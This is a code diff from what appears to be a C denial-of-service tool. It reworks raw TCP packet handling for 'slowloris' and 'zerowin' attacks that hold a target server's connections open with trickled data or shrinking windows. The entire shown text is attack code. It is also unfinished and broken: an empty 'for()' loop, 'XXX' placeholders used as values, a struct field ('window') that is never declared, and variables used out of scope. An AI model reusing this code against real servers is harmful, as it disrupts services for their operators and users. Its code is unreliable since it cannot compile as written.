@@ -41,10 +41,15 @@
 
 typedef struct _tag_TCPCON {
   int         sport;
-  int         timestamp;
   int         mss;
-  int         winsize;  /* current win size */
-  int         sent;     /* offset sent */
+
+  int         timeout; /* milis to wait before sending */
+  int         winsize; /* current win size             */
+  unsigned    flags;
+  unsigned    seq;     /* seq                          */
+  unsigned    ack;     /* last acked bytes             */
+  int         offset;  /* current offset               */
+  int         tosend;  /* next bytes to sent           */
   struct _tag_TCPCON *next;
 } TCP_CON;
 
@@ -170,7 +175,7 @@ static void slowy__listen(THREAD_WORK *tw)
             TCP_HEADER(m->b)->rst,
             IP_HEADER(m->b)->saddr, tc->shost.addr.in.addr);
 
-    /* in some special case (handshake) send kakitas */
+    /* in some special case (handshake) send kakita */
     if(TCP_HEADER(m->b)->syn != 0
     && TCP_HEADER(m->b)->ack != 0)
     {
@@ -191,35 +196,37 @@ static void slowy__listen(THREAD_WORK *tw)
                          NULL, 0,
                          NULL, 0);
 
+      /* prepare first request packet to schedule (common for both attacks) */
+      c->offset  = 0;
+      c->seq     = TCP_HEADER(m->b)->ack_seq;
+      c->ack     = TCP_HEADER(m->b)->seq + 1;
+      c->flags   = TH_ACK;
+    }
+
+    if(TCP_HEADER(m->b)->ack != 0)
+    {
+      /* decide how much to send ... */
+      s = tc->zerowin ? c->mss : (rand() & 0x07) + 1;
+
+      /* (both) send data (if there is any available) */
+      if(c->offset + s < tc->payload_size)
+      {
+        c->tosend  = s;
+        c->flags   = TH_ACK;
+      } else {
+        c->tosend  = tc->payload_size - c->offset;
+        c->flags   = TH_ACK | TH_PUSH;
+      }
+
+      /* decide other parameters (depending on attack) */
       if(tc->zerowin)
       {
         /* (zerowin) */
-
-        /* send request in one TCP packet */
-        ln_send_tcp_packet(tc->lnc,
-                           &tc->shost.addr.in.inaddr, ntohs(TCP_HEADER(m->b)->dest),
-                           &tc->dhost.addr.in.inaddr, tc->dhost.port,
-                           TH_ACK | TH_PUSH,
-                           ntohs(TCP_HEADER(m->b)->window),
-                           ntohl(TCP_HEADER(m->b)->ack_seq),
-                           ntohl(TCP_HEADER(m->b)->seq) + 1,
-                           (char *) tc->payload, tc->payload_size,
-                           NULL, 0);
+        c->timeout = 0;
+        c->window  = c->window - XXX; /* XXX TODO XXX */
       } else {
         /* (slowloris) */
-
-        /* first data TCP packet (random size) */
-        ln_send_tcp_packet(tc->lnc,
-                           &tc->shost.addr.in.inaddr, ntohs(TCP_HEADER(m->b)->dest),
-                           &tc->dhost.addr.in.inaddr, tc->dhost.port,
-                           TH_ACK | TH_PUSH,
-                           ntohs(TCP_HEADER(m->b)->window),
-                           ntohl(TCP_HEADER(m->b)->ack_seq),
-                           ntohl(TCP_HEADER(m->b)->seq) + 1,
-                           (char *) tc->payload, tc->payload_size,
-                           NULL, 0);
-
-        /* set timeout */
+        c->timeout = XXX; /* XXX TODO XXX */
       }
     } else
     if(TCP_HEADER(m->b)->fin != 0
@@ -228,18 +235,6 @@ static void slowy__listen(THREAD_WORK *tw)
       /* kill connection */
       /*   - (fin) schedule fin/ack packet */
       /*   - (fin&rst) remove directly */
-    } else
-    if(TCP_HEADER(m->b)->ack != 0)
-    {
-      /* depending on attack */
-
-      /* (slowloris) schedule one ack and data */
-      /* XXX TODO XXX */
-      /* (slowloris) if no more req, then start to ack contents */
-      /* XXX TODO XXX */
-
-      /* (zerowin) ack content and reduce window */
-      /* XXX TODO XXX */
     }
 
     /* release msg buffer */
@@ -248,6 +243,19 @@ static void slowy__listen(THREAD_WORK *tw)
 
   /* send scheduled packets */
   /* XXX TODO XXX */
+  for()
+  {
+    /* send request in one TCP packet */
+    ln_send_tcp_packet(tc->lnc,
+                       &tc->shost.addr.in.inaddr, ntohs(TCP_HEADER(m->b)->dest),
+                       &tc->dhost.addr.in.inaddr, tc->dhost.port,
+                       TH_ACK | TH_PUSH,
+                       ntohs(c->window),
+                       ntohl(c->seq),
+                       ntohl(c->ack),
+                       ((char *) tc->payload) + c->offset, c->tosend,
+                       NULL, 0);
+  }
 }
 
 /*+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
